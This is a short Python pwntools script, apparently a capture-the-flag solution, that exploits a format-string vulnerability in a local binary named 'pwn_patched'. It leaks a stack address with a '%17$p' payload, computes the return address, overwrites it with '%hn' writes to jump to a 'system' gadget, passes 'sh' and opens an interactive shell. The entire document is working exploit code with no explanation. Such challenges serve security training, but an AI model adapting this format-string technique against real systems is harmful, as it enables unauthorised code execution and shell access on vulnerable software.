from pwn import *
context(os='linux', arch='amd64', log_level='debug')
# p = remote('127.0.0.1', 39865)
p = process('./pwn_patched')
system = 0x40127b
def talk(payload, final_payload=None):
    p.sendafter(b'...', payload)  
    if final_payload:
        p.sendafter(b'!', final_payload)
        return b''
    else:
        return  p.sendafter(b'!', b'\x00'*8)
resp = talk(b'%17$p')
leak_idx = resp.find(b'0x')
leak_addr = int(resp[leak_idx : leak_idx+14], 0)
log.success(f"leak:{hex(leak_addr)}")
ret_addr = leak_addr - 0x130
talk(f'%{ret_addr & 0xffff}c%17$hn'.encode())
talk(f'%{system & 0xffff}c%47$hn'.encode(), final_payload=b'sh\x00')
p.interactive()